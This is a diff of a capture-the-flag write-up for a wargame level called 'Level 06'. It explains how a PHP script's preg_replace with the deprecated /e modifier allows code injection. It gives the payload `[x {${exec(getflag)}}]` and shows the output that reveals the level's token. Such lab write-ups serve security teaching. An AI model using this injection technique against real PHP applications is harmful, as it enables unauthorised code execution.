@@ -1,14 +1,9 @@
 # Level 06
 
-```
-./level06
-./level06 file
-# So it prints the content of the file
-```
+```bash
+cat level06.php
 
-http://beautifytools.com/php-beautifier.php
-
-```php
+#!/usr/bin/php
 <?php
 function y($m)
 {
@@ -29,22 +24,16 @@ print $r;
 ?>
 ```
 
-The vulnerability seems to come from the /e https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
+The script goes through an input file and makes some character replacements. It appears to use the 'e' regex modifier in x() along with a wildcard. This modifier allows the [use of php code](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) within the argument.
 
-= PHP code within your regular expression.
+By matching the `preg_replace pattern [x .*]`, we can inject our own code to the script.
 
-https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
-
-So if the input match `/(\[x (.*)\])` , we execute the code.
-
-We can exec system commands with `exec()`
-
-So
-
-```
-echo "[x {${exec(getflag)}}]" > /tmp/res
+```bash
+echo "[x {${exec(getflag)}}]" > /tmp/inj
 ```
 
-
-
-we get an error with the token
+```bash
+./level06 /tmp/inj
+# HP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+# PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+```
